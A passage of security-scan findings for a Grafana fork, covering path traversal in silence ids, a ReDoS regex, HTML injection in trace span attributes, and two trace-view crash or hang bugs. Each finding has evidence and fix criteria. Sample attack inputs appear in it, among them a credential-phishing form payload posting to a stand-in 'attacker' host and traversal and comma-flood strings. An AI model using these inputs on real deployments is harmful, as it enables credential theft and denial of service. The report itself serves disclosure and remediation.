1. The attacker controls an external Alertmanager/Mimir datasource response (compromised upstream, or MITM on the proxied path) and returns non-expired silences whose ids contain `../` segments. A Grafana user who has selected that Alertmanager and holds alert.instances.external:write (Editor/Admin by default) opens the Silences page and clicks "Unsilence" on a crafted row, which looks like any other silence; the browser issues a DELETE to the attacker-chosen same-origin API path with the victim's session cookie and org header. The attacker needs no Grafana privileges. A configured external Alertmanager datasource is a deployment precondition (attack requirements present). Assumption: the Go proxy for external Alertmanagers (not in checkout) passes the upstream `id` string through unmodified, as the Alertmanager gettableSilence model places no format constraint on it.

## Recommended fix
1. alertSilencesApi builds `/api/v2/silence/${id}` by interpolating an upstream-supplied id without percent-encoding, so `..`/`/` in the id are interpreted as path structure instead of data. Fix criteria: The silence id must be confined to a single path segment (percent-encoded, and/or rejected if it contains `/`, `..`, `?`, `#`) for getSilence and expireSilence. Verify that a silence whose id is `../../x` produces a request to `/api/alertmanager/<ds>/api/v2/silence/..%2F..%2Fx` (or is refused), never to `/api/x`.
2. The alerting RTK base query sends URLs without backend_srv's validatePath option, so no layer rejects dot segments in paths assembled from data. Fix criteria: Requests whose path is assembled from API-supplied identifiers should pass through path validation that refuses `..` segments; confirm that a DELETE with a traversing path is rejected client-side before fetch().

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Path traversal
**CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256261

---

# Quadratic matcher-splitting regex on URL queryString hangs alerting pages from a crafted link

## Details
`parsePromQLStyleMatcherLoose` (utils/matchers.ts:91-103) tokenises a matcher string with `split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)`. The lookahead is evaluated at every comma and, because it ends in `[^"]*$`, must walk from that comma to the end of the string each time (the quote-balanced group consumes quotes deterministically, so the engine cannot stop early; with no quotes the greedy `[^"]*` first runs to the end, fails on `"`, backtracks, then `[^"]*$` runs to the end again). For n characters containing k commas the work is Θ(k·(n−i)) summed over comma positions i — Θ(n²) for a comma-dense string such as `,,,,…` or `a,a,a,…`. No length limit is applied anywhere on the path.

The string is the `queryString` URL parameter, read on several alerting pages and parsed synchronously on the main thread during render, several times per render:
- `/alerting/routes` (notification policies): Filters.tsx reads `searchParams.get('queryString')` (native URLSearchParams via useURLSearchParams) and calls `parsePromQLStyleMatcherLoose(queryString)` at line 71 in render, plus `parsePromQLStyleMatcherLooseSafe` in useMemo at lines 42 and 244.
- `/alerting/groups`: AlertGroups.tsx:49 parses it on every render, and AlertGroupFilter → MatcherFilter.tsx:38 parses it again in render. (`useQueryParams` → `locationSearchToObject` from @grafana/runtime is assumed, per the pinned version, to return the decoded string unchanged for non-numeric values; `getFiltersFromUrlParams` then coerces it with `String()` and applies no bound.)
- `/alerting/silences`: SilencesFilter.tsx:43 parses it in a useState initialiser on mount; SilencesTable.tsx:240 parses it again once per silence inside `useFilteredSilences`.
- `/alerting/list`: useFilteredRules.ts:69 parses the legacy `queryString` parameter in an effect.

All of these routes are readable by the basic Viewer role (docs/sources/alerting/set-up/configure-roles: Viewer has read access to alert rules, notification policies and silences), so any logged-in user is a victim. An unauthenticated attacker who gets such a user to open `/alerting/routes?queryString=,,,,…` (a link on an attacker page, chat, email) freezes that user's tab: ~150 KB of commas is ~10^10 character steps (on the order of ten seconds), ~1 MB is ~5·10^11 steps (minutes), and React re-runs the parse on subsequent renders. Assumption about the out-of-scope Go binary: Grafana does not override Go net/http's DefaultMaxHeaderBytes (1 MiB), so request lines of this size are accepted; `max_request_body_bytes` in conf/defaults.ini bounds only the body. A reverse proxy with a small URL limit (nginx default ~8 KB) is an external mitigation that blunts the attack to tens of milliseconds, but it is not a control the project ships or documents as required.

Impact is confined to the victim's browser tab (client availability, recoverable by closing the tab), so severity is low, but it is a deterministic super-linear regex cost set by attacker input and reachable from a URL — the ReDoS case the recorded threat model keeps in scope.

Root cause: a regular expression with an end-anchored lookahead is used to split untrusted, unbounded input, giving quadratic worst-case time.

## Evidence
1. [public/app/features/alerting/unified/utils/matchers.ts:91–102](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/matchers.ts#L91-L102)
   parsePromQLStyleMatcherLoose splits the raw input with /,(?=(?:[^"]*"[^"]*")*[^"]*$)/. The lookahead must scan to the end of the string (`[^"]*$`) for every comma, so cost is sum over commas of the remaining length: O(n^2) for a comma-dense input. No length limit is applied.
2. [public/app/features/alerting/unified/components/alert-groups/MatcherFilter.tsx:33–41](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/alert-groups/MatcherFilter.tsx#L33-L41)
   The alert-groups filter calls parsePromQLStyleMatcherLoose(defaultQueryString) synchronously during render, where defaultQueryString is the `queryString` URL parameter (AlertGroupFilter.tsx:24 via getFiltersFromUrlParams).
3. [public/app/features/alerting/unified/AlertGroups.tsx:44–49](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/AlertGroups.tsx#L44-L49)
   The page component reads queryString via useQueryParams/getFiltersFromUrlParams and calls parsePromQLStyleMatcherLooseSafe(queryString) on every render (line 49), on the main thread, before anything is displayed.
4. [public/app/features/alerting/unified/components/notification-policies/Filters.tsx:66–74](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/notification-policies/Filters.tsx#L66-L74)
   The notification-policies page parses the `queryString` URL parameter in render (and again in useMemo at 41-44 and 243-246), so /alerting/routes?queryString=... is a second entry point.
5. [public/app/features/alerting/unified/components/silences/SilencesFilter.tsx:42–47](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/silences/SilencesFilter.tsx#L42-L47)
   The silences page filter parses the `queryString` URL parameter unconditionally in a useState initialiser on mount (line 43); SilencesTable.tsx:240 additionally re-parses it once per silence inside useFilteredSilences. /alerting/silences?queryString=... is a third entry point.

## Impact
Only the victim's browser tab is affected: the alerting page becomes unresponsive until the parse finishes or the tab is closed. No data is disclosed or modified and the server is not involved beyond serving index.html.

## Reproduction steps
1. Attacker (no account) crafts a Grafana link whose `queryString` parameter is a long comma-dense string and gets a logged-in user (any basic role, including Viewer) to open it. On load the alerting page parses the parameter with the quadratic split on the main thread and the tab hangs for seconds to minutes depending on URL length. Nothing in the shipped frontend or default configuration bounds the parameter; the only assumption is that the Go server accepts request lines up to net/http's 1 MiB default header limit. A third-party reverse proxy with a short URL limit would blunt the attack, but that is an external mitigation rather than a condition of the vulnerable system as shipped, so AT is NONE. UI is PASSIVE: the victim only has to open the link.

## Recommended fix
1. The comma-splitting regex re-scans to end-of-string for every comma, making tokenisation O(n^2) on attacker-controlled input. Fix criteria: Tokenise matchers with a single linear pass (track quote state while scanning) instead of an end-anchored lookahead regex. Verify that parsing a 1 MB string of commas completes in well under a second.
2. URL-supplied filter strings are parsed with no size bound, in render, on three pages. Fix criteria: Reject or truncate `queryString` values beyond a sane length (a few KB) before parsing, and parse once (memoised) rather than on every render; confirm an oversized parameter shows a validation error without freezing the page.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256260

---

# Trace attribute values typed code/text and stack traces concatenated raw into span-detail HTML

## Details
KeyValuesTable renders every span attribute, resource attribute, event field and stack trace as HTML. For rows whose `type` is `code` or `text` the value is concatenated into an HTML string without escaping (`<pre style=...>${row.value}</pre>` / `<span ...>${row.value}</span>`, KeyValuesTable.tsx:283/285), then passed to `DOMPurify.sanitize()` with the default profile and injected via `dangerouslySetInnerHTML` (291). The other branch (jsonMarkup) escapes, and the project's own test asserts that escaping.

Both the branch selector and the payload come from the trace DataFrame. `transformTraceDataFrame` spreads every row property into the span model (transform.ts:51), `asTagArray` only checks for an array, and SpanDetail (a) wraps each `stackTraces[]` string as `{type:'code', value}` and (b) passes tag objects through unchanged, so a tag such as `{"key":"x","type":"text","value":"<style>...</style><form action=https://attacker method=post><input type=password>"}` is rendered as markup in the authenticated Grafana origin. Producers: (1) a compromised or man-in-the-middled trace backend behind the bundled Jaeger datasource — live queries go through its Go backend, whose binary carries struct tags `json:"key"`/`json:"type"`/`json:"value"`/`json:"stackTraces"` consistent with verbatim mirroring of Jaeger span JSON (assumption: compiled code), and whose frontend upload transform copies `tags`/`stackTraces` verbatim; (2) any third-party tracing datasource plugin; (3) dashboard snapshots / `grafana` datasource `queryType: 'snapshot'` frames, which return saved frame JSON unnormalised (grafana/datasource.ts:97-104) into the Traces panel, so a snapshot or dashboard author controls tag objects exactly. The span/resource attribute accordions are open by default once a span row is expanded (DetailState.tsx:44-45).

DOMPurify is the only control. The bundled DOMPurify is 3.4.12/3.4.13 (public/build/9418.*, 7606.*); its default allowlists (recovered from the source map) include `style`, `form`, `input`, `button`, `img`, `a`, `audio`, `video`, `marquee`, `svg`/`image` tags and `action`, `method`, `href`, `src`, `srcset`, `poster`, `style`, `background` attributes, while removing `<script>`, `on*` handlers and `javascript:` URIs. So direct script execution is blocked, but attacker-controlled active content lands in the Grafana page: page-wide CSS via `<style>`/style attributes (overlays spoofing the UI, CSS selector-based attribute exfiltration), `<form action=https://attacker method=post>` with password inputs rendered inside the trusted origin, `<a href=https://attacker>` same-tab navigation on click, and `<img>/<video>/<audio>` sources that beacon the viewer's IP and the fact they opened the trace. The intended rendering is a verbatim code block, so the value should be HTML-escaped (as jsonMarkup already does) before any sanitisation.

Reachability: any Grafana user who can open a trace from the affected datasource in Explore (TraceViewContainer), the Traces panel (TracesPanel) or the logs-detail trace view (LogLineDetailsTrace), or who opens a dashboard snapshot containing a traces panel. React 19's `javascript:` blocking does not apply because the sink is `dangerouslySetInnerHTML`.

## Evidence
1. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx:280–291](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L280-L291)
   For rows whose `type` is 'code' or 'text', `row.value` is string-concatenated unescaped into `<pre>`/`<span>` markup (283, 285); only the fallback branch goes through jsonMarkup's escape(). The string is then passed to DOMPurify.sanitize() with no config (default profile) and injected with dangerouslySetInnerHTML (291). Both `row.type` and `row.value` arrive from the trace frame.
2. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx:555–570](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx#L555-L570)
   Span `stackTraces` strings from the trace frame are wrapped as `{ type: 'code', value: stackTrace }` and handed to AccordionKeyValues -> KeyValuesTable, i.e. the raw-concatenation branch. Lines 365-367 and 485-522 pass `tags` / `process.tags` objects through untouched (`otherTags: tags`), so a tag object that itself carries `type: 'text'|'code'` reaches the same branch; AccordionKeyValues/AccordionCategorizedKeyValues forward `data` unchanged.
3. [public/app/features/explore/TraceView/utils/transform.ts:10–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/utils/transform.ts#L10-L13)
   Legacy single-field frames use the raw value object as the TraceResponse; `transformTraceDataFrame` (22-61) spreads every row property (`...s`, line 51) including `stackTraces` and the untouched `tags` objects into the span model. No field is type-checked or normalised. Called from Explore (TraceViewContainer.tsx:26), TracesPanel.tsx:34 and LogLineDetailsTrace.tsx:91.
4. [public/app/features/explore/TraceView/components/model/transform-trace-data.tsx:36–37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/model/transform-trace-data.tsx#L36-L37)
   asTagArray only checks Array.isArray; deduplicateTags/orderTags keep the same tag objects, so a `type` property set upstream survives into rendering.
5. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/DetailState.tsx:44–45](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/DetailState.tsx#L44-L45)
   Span and resource attribute accordions are open by default when a span row is first expanded, so a `type:'text'` tag renders as soon as the victim clicks the span; the stack-trace accordion needs one more click.
6. [public/app/plugins/datasource/grafana/datasource.ts:97–104](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana/datasource.ts#L97-L104)
   In-checkout producer of arbitrary trace frames: `queryType: 'snapshot'` returns `target.snapshot` frames from the saved dashboard/snapshot JSON via dataFrameFromJSON with no normalisation (transformSceneToSaveModel.ts:343-359 writes them on snapshot creation). A snapshot or dashboard author therefore controls tag objects and `stackTraces` exactly, and TracesPanel.tsx:34/58 feeds `data.series[0]` to TraceView.
7. [data/plugins-bundled/jaeger/module.js](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/jaeger/module.js) (whole file)
   In this build the Jaeger datasource's live trace query goes through `super.query` (datasource.ts:74 in module.js.map), i.e. the compiled Go backend gpx_grafana-jaeger-datasource_linux_amd64; the frontend `createTraceFrame`/`toSpanRow` (responseTransform.ts:54-56) copies `tags: span.tags` and `stackTraces: span.stackTraces` verbatim but is reached only for the 'upload' query type. The ELF's non-protobuf struct tags `json:"key"`, `json:"type"`, `json:"value"`, `json:"tags"`, `json:"stackTraces"`, `json:"warnings"` are consistent with Go structs mirroring the Jaeger span JSON (KeyValue{key,type,value}) — so an upstream `type` string and `stackTraces` round-trip into the frame; this is an assumption about compiled code, not read source.
8. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/jsonMarkup.js:66–67](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/jsonMarkup.js#L66-L67)
   Contrast: the default (jsonMarkup) branch HTML-escapes keys and string values (KeyValuesTable.test.tsx 'properly escapes json values' asserts this), so the defect is confined to the code/text branches that bypass it.

## Impact
Script execution is blocked by DOMPurify's default profile, so impact is attacker-controlled markup in the authenticated origin: credential-phishing forms and CSS overlays spoofing Grafana UI (integrity low), and outbound image/media/CSS requests that leak the viewer's IP and the fact they viewed the trace, plus CSS-selector attribute exfiltration from the page (confidentiality low). No availability impact.

## Reproduction steps
1. Attacker controls the trace backend (compromised Jaeger/third-party tracing datasource or the network path to it) and returns a span whose tag object has `type:'text'` or whose `stackTraces` array contains markup; alternatively a snapshot/dashboard author embeds such a frame in a `grafana` datasource snapshot query. A Grafana user opens the trace and expands the span; the attribute accordions are open by default and the HTML renders immediately. No Grafana privileges are needed on the datasource path; the victim performs only routine navigation (UI:P). DOMPurify 3.4.12/3.4.13 default profile is the only barrier and permits style/form/input/img/a/media elements (allowlists recovered from public/build source maps). The Jaeger live path depends on the compiled Go backend passing `type` and `stackTraces` through; its binary's `json:"type"`/`json:"stackTraces"` struct tags support this but it is an explicit assumption; the frontend upload transform and the snapshot path are verified in source.

## Recommended fix
1. KeyValuesTable builds HTML for `code`/`text` rows by string concatenation of an untrusted value, relying on DOMPurify alone instead of escaping; DOMPurify's default profile preserves style, form, anchor and media elements. Fix criteria: A code/text attribute value containing `<style>`, `<form>`, `<img src>`, `<a href>` or any other tag must render as literal text (identical to what jsonMarkup's escape() produces) — e.g. by HTML-escaping the value or rendering it through React text nodes in a <pre>; verify that a span tag with type 'text' and value '<img src=//x>' produces no element and no outbound request.
2. The trace model trusts the datasource-supplied `type` property on TraceKeyValuePair objects (and the `stackTraces` field) without normalisation, letting upstream data choose the rendering branch. Fix criteria: Attribute objects entering the span model are normalised to {key, value} with `type` only set by trusted Grafana code paths (e.g. stack traces), so a datasource cannot select the raw-HTML branch; verify a Jaeger response with `type:'code'` on a tag renders via the escaping branch.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256259

---

# Non-string peer.service tag value throws TypeError in trace color generator, making the whole trace unviewable

## Details
In `VirtualizedTraceView.renderSpanBarRow` (VirtualizedTraceView.tsx:456-464), when a span has no children, is of kind `client` (OTLP `span.kind` field, or a `span.kind=client` tag for Jaeger) and carries a `peer.service` tag, the raw tag value is passed to `getColorByKey(peerServiceKV.value, theme)` and also rendered as the peer service label (SpanBarRow.tsx:574-579). `ColorGenerator._getColorIndex` (color-generator.tsx:46-50) computes `key ? key.toLowerCase() : ''`; a truthy non-string (Number 1, `true`, a non-zero double, any array) has no `toLowerCase` and a `TypeError` is thrown synchronously during React render.

Tag values are untyped (`any`): both bundled tracing plugins place span tags in a `FieldType.other` frame field whose values pass through `transformTraceDataFrame`, `asTagArray`, `deduplicateTags` and `orderTags` without coercion. The Jaeger plugin's frontend `createTraceFrame`/`toSpanRow` (datasource.ts:64 → responseTransform.ts:54) copies `span.tags` verbatim from Jaeger's JSON, where int64/bool/float64 tags are typed JSON values (assumption: Jaeger query API returns `value` typed per `type`, as jaeger-ui's own model expects). The Tempo plugin's `getAttributeValue` (resultTransformer.ts:33-58) returns Boolean/Number/Array for OTLP bool/int/double/array attributes on the uploaded-OTLP path (datasource.ts:482); trace-by-ID frames (datasource.ts:606) are built by the Tempo Go backend, which is unreadable in this checkout and is assumed to preserve attribute types in the same `tags` other-typed field.

Attacker and gain: a span producer — a peer service, or anyone with write access to the OTLP/Jaeger ingest of the tracing backend Grafana queries — emits one leaf client span with `peer.service` set to a non-string value (e.g. int 1) under the trace ID of any trace (trace IDs are propagated to every participant). Every Grafana user who opens that trace in Explore or a dashboard Traces panel gets a render exception; `ErrorBoundaryAlert` (Explore.tsx:797-801; @grafana/scenes VizPanelRenderer for dashboards) replaces the trace view with an error alert, so the rest of Grafana keeps working but that trace — including every other service's spans in it — cannot be inspected on any load until the span is purged from the backend. A malicious datasource itself gains nothing new (it can already return an error); the gain is for the span-producer position, which the project does not otherwise concede the ability to break rendering. Impact is a deterministic, data-driven (not volumetric) denial of one trace's visibility; a fix must coerce or type-check the tag value before using it as a color key or label.

## Evidence
1. [public/app/features/explore/TraceView/components/TraceTimelineViewer/VirtualizedTraceView.tsx:456–464](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/VirtualizedTraceView.tsx#L456-L464)
   Primary location. `span.tags.find(kv => kv.key === PEER_SERVICE)` returns the raw tag; for a leaf client span its `any`-typed `.value` is passed to `getColorByKey()` as the color key and stored as `serviceName` with no type check or String() coercion.
2. [public/app/features/explore/TraceView/components/utils/color-generator.tsx:46–49](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/utils/color-generator.tsx#L46-L49)
   Sink: `_getColorIndex` does `this.cache.get(key)` (miss for a fresh key) then `key ? key.toLowerCase() : ''`. A truthy non-string key (Number 1, true, array) has no toLowerCase, so a TypeError is thrown synchronously inside React render. `getColorByKey` (line 128) forwards the key unchanged.
3. [public/app/features/explore/TraceView/components/TraceTimelineViewer/utils.tsx:119–124](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/utils.tsx#L119-L124)
   `isKindClient` is satisfied by `span.kind === 'client'` (set from OTLP SpanKind by the Tempo transform) or by a `span.kind=client` tag (Jaeger); both are ordinary span-producer-controlled values.
4. [public/app/features/explore/TraceView/components/model/transform-trace-data.tsx:229–242](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/model/transform-trace-data.tsx#L229-L242)
   `span.tags` is normalised with asTagArray, deduplicateTags and orderTags; none of these coerce or validate tag values, so a Number/Boolean/Array value survives to the renderer.
5. [data/plugins-bundled/jaeger/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/jaeger/module.js.map) (whole file)
   Recovered responseTransform.ts: createTraceFrame declares `{ name: 'tags', type: FieldType.other }` (line 20) and toSpanRow copies `tags: span.tags` verbatim (line 54) from Jaeger's JSON response; datasource.ts:64 runs this transform in the frontend, so typed int64/bool tag values reach the trace view unchanged.
6. [data/plugins-bundled/tempo/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js.map) (whole file)
   Recovered resultTransformer.ts: getAttributeValue (lines 33-58) returns Boolean/Number/Array for OTLP bool/int/double/array attributes and tags are a FieldType.other field (line 162); used via transformFromOTLP for uploaded OTLP JSON (datasource.ts:482). Trace-by-ID frames (datasource.ts:606) come from the Go backend (not in checkout) and are assumed to preserve attribute types likewise.
7. [public/app/features/explore/Explore.tsx:797–800](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Explore.tsx#L797-L800)
   The thrown TypeError is caught by the ErrorBoundaryAlert 'explore-trace-view-panel', replacing only the trace view with an error alert (dashboard panels are wrapped by @grafana/scenes VizPanelRenderer's ErrorBoundaryAlert). This bounds impact to the affected trace's visibility.

## Impact
No confidentiality or integrity effect. Availability: the trace view for the poisoned trace — including every other service's spans in it — is replaced by an error alert for all users until the span is removed from the backend; ErrorBoundaryAlert keeps the rest of Explore/the dashboard functional, so the loss is limited to one trace's visibility (LOW).

## Reproduction steps
1. The attacker is a span producer (a peer service or anyone able to push spans to the tracing backend Grafana queries) who emits one leaf client span carrying a non-string `peer.service` attribute (e.g. int 1 or true) under a chosen trace ID; no Grafana privileges are needed and the span is ordinary telemetry the backend accepts. The victim only has to open the trace in Explore or a Traces panel (passive interaction). The outcome is deterministic on every load.

## Recommended fix
A datasource-supplied span tag value of arbitrary type (`any`) is used as a string color key (`key.toLowerCase()`) and as a React text label without type validation or coercion. Fix criteria: The peer-service color key and label must only ever be derived from a string: coerce with String() or skip non-string values in VirtualizedTraceView (and/or make ColorGenerator._getColorIndex tolerate non-string keys). Verify by rendering a leaf client span whose `peer.service` tag value is a number, a boolean and an array: the timeline must render without throwing.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-1287](https://cwe.mitre.org/data/definitions/1287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256253

---

# Cyclic span references from a tracing datasource hang the trace view via unbounded ancestor walk

## Details
The trace timeline renders a `SpanTreeOffset` for every span row; that component calls `spanAncestorIds(span)` during render. `spanAncestorIds` walks `span.references`, picking the first reference that has a resolved `.span` and refType CHILD_OF/FOLLOWS_FROM, then repeats from that span in a `while (ref)` loop. There is no visited-set, no depth limit and no check that the referenced span is an ancestor in the tree.

The reference graph it walks is not the tree. `getTraceSpanIdsAsTree` builds the (acyclic) span tree from `references[0]` only, attaching a span whose first reference names an id absent from the trace to the nominal root. `transformTraceData` then resolves `ref.span` for EVERY reference whose spanID exists in the trace, including a reference to the span itself or to one of its descendants. So a span S with references [{CHILD_OF, missing}, {FOLLOWS_FROM, S}] is rendered as a top-level row, and getFirstAncestor(S) skips refs[0] (no `.span`) and returns S via refs[1]; the loop pushes S.spanID forever. The variant {FOLLOWS_FROM, D} where D is a child of S cycles S -> D -> S the same way.

The frame-to-trace transform (`transformTraceDataFrame`) builds references as [CHILD_OF -> parentSpanID] + the frame's `references` column spread verbatim (refType default FOLLOWS_FROM), and the legacy single-field path passes the datasource's raw object through; neither validates reference targets. The bundled Jaeger transformer forwards backend references with their refType (minus the parent), and the bundled Tempo transformer maps every OTLP span link to a reference verbatim, so a span stored in the tracing backend with a missing parent and a link to itself/its child reaches the walker unchanged. (For trace-by-ID queries both bundled plugins' frames are built by their compiled backends; that those backends emit links/references into the `references` column is assumed from the frontend transformers, which document the frame shape. Any third-party datasource returning a trace frame is equally able to supply such references.)

The sink is mounted in Explore (TraceViewContainer), the dashboard Traces panel (TracesPanel) and the logs-to-traces detail view (LogLineDetailsTrace). The hang is deterministic, persistent (stored in the trace), recurs on every load, and throws no exception so no error boundary catches it. This is a termination failure triggered by one specific crafted record (CWE-835), not volumetric load: a single span suffices regardless of trace size.

Note: `ScrollManager.isSpanHidden` has the same unguarded loop but ScrollManager is never instantiated in production code, so it is not part of this finding.

## Evidence
1. [public/app/features/explore/TraceView/components/utils/span-ancestor-ids.tsx:20–40](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/utils/span-ancestor-ids.tsx#L20-L40)
   spanAncestorIds() loops `while (ref)` calling getFirstAncestor(ref), which returns the FIRST reference whose `.span` is resolved and whose refType is CHILD_OF/FOLLOWS_FROM. There is no visited-set, depth bound or comparison against the acyclic tree; if the resolved-reference chain revisits a span the loop never exits and ancestorIDs.push grows until the tab runs out of memory. This is the code the fix must change.
2. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanTreeOffset.tsx:102–112](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanTreeOffset.tsx#L102-L112)
   spanAncestorIds(span) runs synchronously inside React render (useMemo) for every span row. SpanTreeOffset is mounted by SpanBarRow.tsx:624 and SpanDetailRow.tsx:165; VirtualizedTraceView.generateRowStates (lines 133-173) emits a row for every non-collapsed span (top-level spans are never collapsed away) and ListView draws DEFAULT_INITIAL_DRAW = 100 rows on mount, so a hostile top-level span is rendered as soon as the trace opens.
3. [public/app/features/explore/TraceView/components/model/transform-trace-data.tsx:249–264](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/model/transform-trace-data.tsx#L249-L264)
   For every reference whose spanID is in spanMap, `ref.span` is set to the live span object — including a reference to the span itself (spanMap.get(ref.spanID) === span) or to one of its descendants. No check that the referenced span is an ancestor in the tree that getTraceSpanIdsAsTree built.
4. [public/app/features/explore/TraceView/components/selectors/trace.ts:48–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/selectors/trace.ts#L48-L60)
   The span tree (which fixes depth/childSpanIds and is acyclic by construction) is built from references[0] ONLY; a span whose references[0] names an id absent from the trace is attached to the nominal root (`nodesById.get(parentID) || root`) and rendered. Its later references are never consulted here, so the tree's acyclicity does not extend to the reference graph that spanAncestorIds walks.
5. [public/app/features/explore/TraceView/utils/transform.ts:42–48](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/utils/transform.ts#L42-L48)
   Each frame row becomes a span whose references are [CHILD_OF -> s.parentSpanID (whatever the datasource supplied, present in the trace or not)] followed by every entry of the frame's `references` column spread verbatim with refType defaulting to FOLLOWS_FROM (overridable by the datasource value). The legacy single-field path (lines 10-14) hands the datasource's raw object, including arbitrary `references`, straight to transformTraceData. This is the only boundary between datasource output and the walker, and it validates nothing.
